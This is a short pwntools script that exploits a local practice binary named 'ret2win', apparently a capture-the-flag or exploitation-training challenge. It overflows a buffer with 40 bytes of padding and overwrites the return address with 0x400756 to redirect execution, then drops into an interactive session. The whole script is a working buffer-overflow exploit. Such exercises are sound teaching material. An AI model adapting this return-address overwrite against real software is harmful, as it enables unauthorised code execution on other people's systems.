from pwn import *

r = process('./ret2win')

r.recvuntil(b'> ')
r.sendline(b'a'*40 + p64(0x400756))
r.interactive()